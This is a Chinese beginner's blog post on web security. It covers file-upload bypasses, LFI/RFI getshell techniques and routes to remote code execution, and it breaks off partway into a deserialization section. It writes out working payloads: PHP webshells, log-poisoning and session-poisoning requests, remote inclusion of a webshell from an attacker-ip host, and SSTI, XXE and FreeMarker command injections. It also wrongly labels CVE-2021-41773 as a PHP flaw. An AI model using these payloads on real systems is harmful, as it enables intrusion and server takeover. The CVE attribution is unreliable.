<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>文件包含+文件上传+RCE+SQL+XSS+XXE - Sky&#039;s Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Sky&#039;s Blog"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Sky&#039;s Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="入门网络安全-从0到1"><meta property="og:type" content="blog"><meta property="og:title" content="文件包含+文件上传+RCE+SQL+XSS+XXE"><meta property="og:url" content="https://flypigc.github.io/2025/12/21/%E4%BB%8E0%E5%88%B01%E7%9A%84hacker/"><meta property="og:site_name" content="Sky&#039;s Blog"><meta property="og:description" content="入门网络安全-从0到1"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1766289592895-ea794790-3ea3-42d8-a9ee-8472ddc49ea2.jpg"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1766289593014-0a1aeb5c-f0b1-404d-bc2f-ecc12b80b8c8.jpg"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1766289593092-20727264-1236-4c41-ba98-36e739016c21.jpg"><meta property="article:published_time" content="2025-12-21T03:45:42.788Z"><meta property="article:modified_time" content="2025-12-21T04:02:45.375Z"><meta property="article:author" content="Sky"><meta property="article:tag" content="web安全"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1766289592895-ea794790-3ea3-42d8-a9ee-8472ddc49ea2.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://flypigc.github.io/2025/12/21/%E4%BB%8E0%E5%88%B01%E7%9A%84hacker/"},"headline":"文件包含+文件上传+RCE+SQL+XSS+XXE","image":["https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1766289592895-ea794790-3ea3-42d8-a9ee-8472ddc49ea2.jpg","https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1766289593014-0a1aeb5c-f0b1-404d-bc2f-ecc12b80b8c8.jpg","https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1766289593092-20727264-1236-4c41-ba98-36e739016c21.jpg"],"datePublished":"2025-12-21T03:45:42.788Z","dateModified":"2025-12-21T04:02:45.375Z","author":{"@type":"Person","name":"Sky"},"publisher":{"@type":"Organization","name":"Sky's Blog","logo":{"@type":"ImageObject","url":"https://flypigc.github.io/img/logo.svg"}},"description":"入门网络安全-从0到1"}</script><link rel="canonical" href="https://flypigc.github.io/2025/12/21/%E4%BB%8E0%E5%88%B01%E7%9A%84hacker/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/6.0.0/css/all.min.css"><link data-pjax rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/11.7.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/cookieconsent/3.1.1/cookieconsent.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.10.0/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.8.1/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdnjs.loli.net/ajax/libs/pace/1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><body class="is-2-column"> <nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" referrerpolicy="no-referrer" alt="Sky&#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/flypigc/"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-9-desktop is-9-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2025-12-21T03:45:42.788Z" title="2025/12/21 11:45:42">2025-12-21</time>发表</span><span class="level-item"><time dateTime="2025-12-21T04:02:45.375Z" title="2025/12/21 12:02:45">2025-12-21</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></span><span class="level-item">3 小时读完 (大约25380个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">文件包含+文件上传+RCE+SQL+XSS+XXE</h1><div class="content"><p>入门网络安全-从0到1</p>
<span id="more"></span>

<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>文件上传靶场操作可以看这篇文章<br><a href="https://flypigc.github.io/2025/12/13/%E9%9D%B6%E5%9C%BA/">pikachu+xss+ssti-labs汇总 - Sky’s Blog</a></p>
<h2 id="绕过手法"><a href="#绕过手法" class="headerlink" title="绕过手法"></a>绕过手法</h2><h4 id="客户端js绕过"><a href="#客户端js绕过" class="headerlink" title="客户端js绕过"></a>客户端js绕过</h4><p>只在前端检查文件类型<br><strong>绕过方法</strong><br>禁用JavaScript：在浏览器中禁用JavaScript，或者在BurpSuite中修改文件名后缀<br>抓包修改文件名：正常上传一个合法的图片文件（<code>1.jpg</code>），然后使用 Burp Suite 拦截数据包，将文件名修改为 <code>1.php</code>。由于服务器后端没有进行二次验证，就会直接上传成功</p>
<h4 id="MIME类型绕过"><a href="#MIME类型绕过" class="headerlink" title="MIME类型绕过"></a>MIME类型绕过</h4><p>服务器有时会通过检查 HTTP 请求头中的 <code>Content-Type</code> 字段来验证文件类型。例如，一个图片的 <code>Content-Type</code> 通常是 <code>image/jpeg</code> 或 <code>image/png</code><br><strong>绕过方法</strong><br><strong>修改</strong> <code>Content-Type</code><strong>：</strong> 攻击者可以上传一个 <code>webshell.php</code> 文件，同时在抓包工具中将 <code>Content-Type</code> 字段从 <code>application/octet-stream</code>（默认值）修改为 <code>image/jpeg</code>。如果后端只依赖这个字段进行判断，恶意文件就会上传成功</p>
<h4 id="文件头内容检测绕过（魔术字节）"><a href="#文件头内容检测绕过（魔术字节）" class="headerlink" title="文件头内容检测绕过（魔术字节）"></a>文件头内容检测绕过（魔术字节）</h4><p><strong>“图片马”：</strong> 攻击者可以将恶意代码嵌入到图片文件中，制作成一个“图片马”<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1766289592895-ea794790-3ea3-42d8-a9ee-8472ddc49ea2.jpg" referrerpolicy="no-referrer" alt="null"><br>可以用画图画一个最小的图片<br>常的图片（<code>1.jpg</code>）和一个包含恶意代码的文本文件（<code>shell.php</code>），内容为 <code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/b + shell.php/a webshell.jpg</span><br></pre></td></tr></table></figure>

<p><strong>利用</strong><br>上传 <code>webshell.jpg</code> 文件。如果服务器检查了文件头，但没有检查文件内容，就会上传成功。<br>然后，攻击者需要找到一种方法来解析这个图片文件，使其作为 PHP 代码执行。这通常需要结合 <strong>文件包含漏洞（LFI）</strong> 来实现，例如 <code>include(&#39;webshell.jpg&#39;)</code>，或者一些服务器配置错误（如 Apache 的 <code>.htaccess</code> 配置）</p>
<h4 id="文件名、路径绕过"><a href="#文件名、路径绕过" class="headerlink" title="文件名、路径绕过"></a>文件名、路径绕过</h4><p>服务器通常会有一份黑名单或白名单来限制可上传的文件扩展名。黑名单会阻止 <code>.php</code>, <code>.asp</code>, <code>.jsp</code> 等脚本文件，而白名单只允许 <code>.jpg</code>, <code>.png</code>, <code>.gif</code> 等图片文件<br> <strong>a. 黑名单绕过</strong><br><strong>大小写绕过</strong>： <code>shell.Php</code>、<code>shell.pHP</code> 等<br><strong>文件后缀名加空格或点</strong>： 在 Windows IIS 服务器上，文件名末尾的空格或点会被自动去除<br><code>shell.php</code> （空格）<br><code>shell.php.</code>（点）<br><strong>双重扩展名</strong>： 某些服务器只检查最后一个扩展名<br><code>shell.php.jpg</code>：上传后，如果服务器处理不当，可能会被当做 <code>shell.php</code> 来执行。<br><strong>特殊字符绕过</strong>： 利用一些特殊字符，如 <code>shell.php%00.jpg</code>（00 截断）<br><strong>00截断</strong>： 在 PHP 5.3 之前，PHP 的 <code>move_uploaded_file()</code> 函数在处理文件名时，遇到 <code>0x00</code> 字节会截断后面的内容。攻击者可以在文件名中注入 <code>%00</code>，如 <code>shell.php%00.jpg</code>，上传时，服务器只检查 <code>.jpg</code>，但实际保存的文件名是 <code>shell.php</code></p>
<p> <strong>b. 白名单绕过</strong><br>服务器解析漏洞：<br>Apache： 如果服务器配置了 AddHandler php5-script .jpg，那么所有 .jpg 文件都会被当作 PHP 脚本来解析</p>
<p>IIS 6.0： 目录解析漏洞，例如 &#x2F;xx.asp&#x2F;shell.jpg。服务器会把 shell.jpg 当作 ASP 脚本执行</p>
<p>IIS 7.0&#x2F;7.5： web.config 配置文件解析漏洞。攻击者可以上传一个恶意的 web.config 文件来改变目录的解析规则</p>
<p>竞争条件（Race Condition）：<br>一些服务器在处理文件上传时，会先将文件临时保存，然后进行安全检查，最后再重命名或移动到目标目录<br>利用方法： 攻击者可以利用这个时间差，在文件被检查并删除之前，迅速访问该文件</p>
<p><strong>步骤：</strong><br>上传一个包含恶意代码的脚本文件（如 shell.php），其中恶意代码会创建一个新的 Webshell 文件<br>在文件上传成功后，但在服务器删除它之前，通过一个脚本循环快速访问该文件<br>恶意脚本被执行，并创建一个新的、无法被删除的 Webshell 文件</p>
<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><h3 id="本地文件包含LFI协议"><a href="#本地文件包含LFI协议" class="headerlink" title="本地文件包含LFI协议"></a>本地文件包含LFI协议</h3><h4 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h4><p>它允许你直接引用本地文件系统中的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/vuln.php?file=file:///etc/passwd</span><br></pre></td></tr></table></figure>

<p>如果 Web 应用没有对路径进行充分过滤，攻击者可以利用 <code>../</code> 来遍历目录，从而访问到 Web 根目录以外的敏感文件</p>
<h3 id="远程文件包含协议"><a href="#远程文件包含协议" class="headerlink" title="远程文件包含协议"></a>远程文件包含协议</h3><p>远程文件包含通常出现在php中，当allow_url_include和allow_url_fopen配置都开启时，web应用可以包含远程服务器上的文件</p>
<p>在<strong>开发为啥要开启</strong>allow_url_include和allow_url_fopen？</p>
<table>
<thead>
<tr>
<th>配置项</th>
<th>核心作用</th>
<th>默认值（PHP）</th>
</tr>
</thead>
<tbody><tr>
<td><code>allow_url_fopen</code></td>
<td>允许 PHP 的文件操作函数（如<code>fopen()</code>、<code>file_get_contents()</code>）访问<strong>远程 URL 资源</strong>（http&#x2F;ftp 等），把远程资源当作 “本地文件” 处理</td>
<td>On（开启）</td>
</tr>
<tr>
<td><code>allow_url_include</code></td>
<td>允许<code>include</code>&#x2F;<code>require</code>等文件包含函数，直接包含<strong>远程 URL 对应的文件</strong>（是<code>allow_url_fopen</code>的 “高危扩展”）</td>
<td>Off（关闭）</td>
</tr>
<tr>
<td><code>allow_url_include</code><strong>开启的场景（仅开发环境）</strong>：</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<ul>
<li><p>测试文件包含逻辑：如果项目有 “合法的远程包含” 需求（极少见，比如多服务器共享通用配置文件），开发时需要验证该逻辑是否正常，开启后可直接测试<code>include(&quot;http://dev-server/common.php&quot;)</code>；</p>
</li>
<li><p>调试漏洞 &#x2F; 安全测试：如果是安全相关的开发（如 Web 安全工具、漏洞扫描器），需要测试 “远程文件包含（RFI）” 漏洞的触发条件，必须开启该配置才能复现场景</p>
</li>
</ul>
<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p>对包含文件进行过滤操作，比如编码或解码。读取PHP文件的源码，因为源码中可能包含数据库凭证等信息<br>如果读取sql密码后，就可以用sql<strong>拿shell</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/vuln.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p>直接从 <strong>POST 请求</strong>的请求体中读取数据，并作为文件内容进行执行。当文件包含漏洞的参数无法直接在 URL 中写入恶意代码时，这是一个非常有用的绕过方法<br>在 POST 请求中，发送数据<code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code>，同时访问<code>http://example.com/vuln.php?file=php://input</code></p>
<h4 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h4><p>协议可以让我们在 URL 中直接嵌入数据，并作为文件内容执行。这在某些情况下可以绕过一些过滤规则，因为它不依赖于外部文件</p>
<p>在 URL 中直接执行恶意代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/vuln.php?file=data://text/plain,&lt;?php%20system(&#x27;id&#x27;);%20?&gt;</span><br></pre></td></tr></table></figure>

<p>如果 Web 应用对 URL 中的特殊字符进行过滤，这种方式可能会失效</p>
<h4 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h4><p>这个协议常用于反序列化攻击，尤其是在 PHAR 归档文件中。攻击者可以创建一个恶意的 PHAR 文件，并在其中嵌入恶意代码或反序列化对象，当服务器通过文件包含加载这个文件时，就会触发反序列化操作<br>利用 PHP 反序列化漏洞，执行任意命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/vuln.php?file=phar:///path/to/archive.phar</span><br></pre></td></tr></table></figure>

<p>这种攻击方式通常需要配合一个反序列化漏洞才能成功</p>
<p>此外还可以上传phar文件，phar文件可以改成任意文件后缀，且不受影响解析</p>
<p>[伪协议](<a target="_blank" rel="noopener" href="https://www.cnblogs.com/a5trid/p/18826001">PHP伪协议 - A5trid - 博客园</a>)</p>
<h2 id="怎么拿shell？"><a href="#怎么拿shell？" class="headerlink" title="怎么拿shell？"></a>怎么拿shell？</h2><h3 id="本地文件LFI包含怎么拿shell"><a href="#本地文件LFI包含怎么拿shell" class="headerlink" title="本地文件LFI包含怎么拿shell"></a>本地文件LFI包含怎么拿shell</h3><p>本地文件包含的拿shell方法通常需要结合其他漏洞或技巧。<br>攻击者无法直接包含一个远程 Webshell，但可以通过多种方式将恶意代码注入到服务器上的某个文件中，然后利用LFI漏洞包含该文件，从而执行恶意代码</p>
<h4 id="日志文件-Getshell"><a href="#日志文件-Getshell" class="headerlink" title="日志文件 Getshell"></a>日志文件 Getshell</h4><p>这是 LFI Getshell 最经典且常用的方法之一。许多 Web 服务器（如Apache、Nginx）会将访问请求记录在日志文件中（如<code>access.log</code> 或 <code>error.log</code>）</p>
<p><strong>利用</strong><br>通过一个特制的 HTTP 请求，将恶意代码（如Webshell 代码）注入到服务器的日志文件中。例如再 URL 中加入或在 User-Agent 字段中写入 Webshell 代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>完整的 HTTP 请求可能看起来像这样：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /?page=test.php HTTP/<span class="number">1.1</span>  </span><br><span class="line">Host: example.com  </span><br><span class="line">User-Agent: <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样，服务器的 <code>access.log</code> 文件中就会记录下这段恶意代码</p>
<p><strong>包含日志文件</strong>：利用 LFI 漏洞，通过文件包含参数（如 <code>page</code> 或 <code>file</code>），包含日志文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?file=../../../../var/log/apache2/access.log</span><br></pre></td></tr></table></figure>

<p>当服务器执行这个请求时，它会把日志文件的内容当作 PHP 代码来执行，从而执行了我们注入的<code>system(&#39;whoami&#39;);</code> 命令</p>
<p><strong>获取 Webshell</strong>：如果注入的是一个完整的 Webshell，现在就可以通过参数来执行任意命令了  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?file=../../../../var/log/apache2/access.log&amp;cmd=ls -al</span><br></pre></td></tr></table></figure>

<h4 id="Session-文件-拿shell"><a href="#Session-文件-拿shell" class="headerlink" title="Session 文件 拿shell"></a>Session 文件 拿shell</h4><p>某些web应用会将用户的seesion信息保存在服务器的&#x2F;tmp&#x2F;目录下的文件中，文件命名 7通常为sess_PHPSESSID</p>
<p>如果攻击者可以控制Session数据，就能通过LFI 包含该文件getshell</p>
<p><strong>利用</strong><br><strong>设置 Session 值</strong>：通过 <code>$_SESSION</code> 变量，将恶意代码注入到 Session 中。这通常需要先找到一个可以控制Session 值的参数，例如在登录或注册时</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><strong>获取 Session 文件路径</strong>：通常 Session 文件的命名是 <code>sess_</code> 加上 Session ID。可以通过浏览器 Cookies 中的<code>PHPSESSID</code> 来获取   </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?file=../../../../tmp/sess_f32921a92a5436687e9544485304a9d7 </span><br></pre></td></tr></table></figure>



<p><strong>执行恶意代码</strong>：当 LFI 漏洞包含该 Session 文件时，恶意代码被执行</p>
<h4 id="proc-self-environ-拿shell"><a href="#proc-self-environ-拿shell" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;environ 拿shell"></a>&#x2F;proc&#x2F;self&#x2F;environ 拿shell</h4><p>在 Linux 系统中，<code>/proc/self/environ</code> 文件存储了当前进程的环境变量。攻击者可以通过设置 User-Agent 等环境变量，将恶意代码注入到该文件中，然后利用 LFI 漏洞包含它</p>
<p><strong>利用步骤：</strong></p>
<p><strong>设置 User-Agent</strong>：发送一个带有恶意 User-Agent 的请求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?page=test.php HTTP/1.1  </span><br><span class="line">Host: example.com  </span><br><span class="line">User-Agent: &lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>包含环境变量文件</strong>：   </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?file=../../../../proc/self/environ</span><br></pre></td></tr></table></figure>

<p><strong>执行恶意代码</strong>：成功包含后，恶意代码即被执行<br><strong>远程文件包含 (RFI) Getshell</strong></p>
<p>RFI 通常比 LFI 更容易利用，因为它允许攻击者直接从自己的服务器上包含并执行恶意文件</p>
<p><strong>利用步骤：</strong></p>
<p><strong>制作 Webshell 文件</strong>：在攻击者自己的服务器上创建一个 Webshell 文件，例如 <code>shell.txt</code>，内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>为了绕过一些过滤，文件名可以不使用 <code>.php</code> 后缀，例如 <code>shell.txt</code> 或 <code>shell.jpg</code></p>
<p><strong>启动 HTTP 服务</strong>：在攻击者的服务器上（如Kali Linux），使用 Python 启动一个简单的 HTTP 服务来托管<code>shell.txt</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80   </span><br></pre></td></tr></table></figure>

<p><strong>远程文件包含</strong>：利用 RFI 漏洞，将 URL 指向攻击者的服务器，包含 <code>shell.txt</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?file=http://attacker-ip/shell.txt</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：为了防止服务器对 URL 进行过滤，有时需要使用编码、伪协议（如 <code>data://</code>）等技巧</p>
<p><strong>连接 Webshell</strong>：如果成功，<code>shell.txt</code> 中的 Webshell 代码已经被执行。现在就可以使用工具（如 Postman、Burp Suite）或直接在 URL 中 POST 数据来执行命令了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?file=http://attacker-ip/shell.txt HTTP/1.1  </span><br><span class="line">Host: example.com  </span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">cmd=ls -al  </span><br></pre></td></tr></table></figure>



<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>rce就是命令执行和代码执行<br>为什么会rce产生，像ssti，sql，xxe，反序列化，文件上传，框架 &#x2F; 解析器漏洞类，配置 &#x2F; 权限错误类等等漏洞，对用户输入未作严格过滤都可能有rce漏洞<br>rce是危害最大的漏洞！！！</p>
<h2 id="为什么会造成rce？"><a href="#为什么会造成rce？" class="headerlink" title="为什么会造成rce？"></a>为什么会造成rce？</h2><p>核心原理是<strong>应用程序未对用户输入进行严格过滤</strong>，将用户可控输入直接拼接进系统命令执行函数（如<code>system</code>、<code>exec</code>），导致攻击者注入的恶意命令被系统执行。 例如：应用程序通过<code>system(&quot;ping &quot; + $_GET[&#39;ip&#39;])</code>执行 ping 命令，若用户输入<code>127.0.0.1;ls</code>，则拼接后命令变为<code>ping 127.0.0.1;ls</code>，其中<code>;ls</code>会被作为新命令执行，最终执行<code>ls</code>查看文件。<br>不同服务器的命令执行区别不同可以看<a target="_blank" rel="noopener" href="https://blog.csdn.net/xzwspy/article/details/80183849">Linux与Windows命令对比_windows与linux命令差异一览表-CSDN博客</a></p>
<h2 id="代码执行命令执行区别"><a href="#代码执行命令执行区别" class="headerlink" title="代码执行命令执行区别"></a>代码执行命令执行区别</h2><p>远程代码执行远程命令执行的区别？</p>
<table>
<thead>
<tr>
<th>对比维度</th>
<th>远程命令执行（Command Execution）</th>
<th>远程代码执行（Code Execution）</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>执行层面</td>
<td>操作系统层（Shell）</td>
<td>编程语言解释器层</td>
<td></td>
</tr>
<tr>
<td>依赖环境</td>
<td>依赖系统 Shell（bash&#x2F;cmd.exe&#x2F;PowerShell）</td>
<td>依赖编程语言解释器（PHP&#x2F;Python&#x2F;Java虚拟机）</td>
<td></td>
</tr>
<tr>
<td>执行对象</td>
<td>系统命令（ls、whoami、netstat）</td>
<td>编程语言代码（phpinfo()、print()、eval()）</td>
<td></td>
</tr>
<tr>
<td>权限继承</td>
<td>直接继承 Web 服务进程的系统权限</td>
<td>先继承解释器权限，执行命令时再继承系统权限</td>
<td></td>
</tr>
<tr>
<td>典型危险函数（PHP）</td>
<td>system()、exec()、passthru()、shell_exec()</td>
<td>eval()、assert()、preg_replace（&#x2F;e模式）</td>
<td></td>
</tr>
<tr>
<td>典型危险函数（Python）</td>
<td>os.system()、subprocess.call()</td>
<td>exec()、eval()、execfile()</td>
<td></td>
</tr>
<tr>
<td>绕过重点</td>
<td>绕过分隔符（;、&amp;、</td>
<td>）、命令关键字过滤</td>
<td>绕过函数禁用、代码语法过滤、沙箱限制</td>
</tr>
<tr>
<td>覆盖范围</td>
<td>仅能执行系统命令，能力有限</td>
<td>可执行代码+调用系统命令，覆盖更广</td>
<td></td>
</tr>
</tbody></table>
<h2 id="怎么利用其他漏洞去rce"><a href="#怎么利用其他漏洞去rce" class="headerlink" title="怎么利用其他漏洞去rce"></a>怎么利用其他漏洞去rce</h2><h4 id="sql怎么去RCE？"><a href="#sql怎么去RCE？" class="headerlink" title="sql怎么去RCE？"></a>sql怎么去RCE？</h4><p>MySQL root 权限下调用<code>sys_exec()</code>；<br>Payload：<code>select sys_exec(&#39;ls /etc&#39;);</code>（需安装<code>lib_mysqludf_sys</code>插件）</p>
<h4 id="ssti怎么去rce？"><a href="#ssti怎么去rce？" class="headerlink" title="ssti怎么去rce？"></a>ssti怎么去rce？</h4><p>漏洞代码：<code>return render_template_string(&quot;Hello &quot; + name)</code>；<br>Payload：<code>&#123;&#123; __import__('os').popen('ls').read() &#125;&#125;</code>。</p>
<h4 id="xxe怎么去rce？"><a href="#xxe怎么去rce？" class="headerlink" title="xxe怎么去rce？"></a>xxe怎么去rce？</h4><p>Java 解析 XML 时允许外部实体，且系统支持<code>expect</code>协议；<br>Payload：<code>&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;</code>（执行<code>id</code>命令）。</p>
<h4 id="框架-解析器漏洞类怎么RCE？"><a href="#框架-解析器漏洞类怎么RCE？" class="headerlink" title="框架 &#x2F; 解析器漏洞类怎么RCE？"></a>框架 &#x2F; 解析器漏洞类怎么RCE？</h4><table>
<thead>
<tr>
<th>漏洞类型</th>
<th>触发原因</th>
<th>典型场景 &#x2F; 例子</th>
</tr>
</thead>
<tbody><tr>
<td>模板引擎漏洞（如 Freemarker）</td>
<td>框架自身的语法 &#x2F; 函数设计缺陷，允许执行代码</td>
<td>- 场景：FreeMarker 模板中调用危险函数；  - Payload：<code>$&#123;&quot;freemarker.template.utility.Execute&quot;?new()(&quot;id&quot;)&#125;</code>。</td>
</tr>
<tr>
<td>服务器解析漏洞（结合文件上传）</td>
<td>服务器对文件后缀 &#x2F; 内容的解析规则缺陷，导致上传的脚本被执行</td>
<td>- 场景：Apache 解析漏洞（<code>1.php.xxx</code>被当作 PHP 执行）；  - 配合文件上传：上传<code>shell.php.xxx</code>，访问后触发代码执行。</td>
</tr>
<tr>
<td>脚本引擎漏洞（如 PHP&#x2F;Java）</td>
<td>解释器自身的内存溢出 &#x2F; 逻辑漏洞，触发后执行任意代码（0day&#x2F;1day）</td>
<td>- 例子：PHP 7.4.x 代码执行漏洞（CVE-2021-41773）、Java 反序列化漏洞（CVE-2017-10271）。</td>
</tr>
</tbody></table>
<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><table>
<thead>
<tr>
<th>漏洞类型</th>
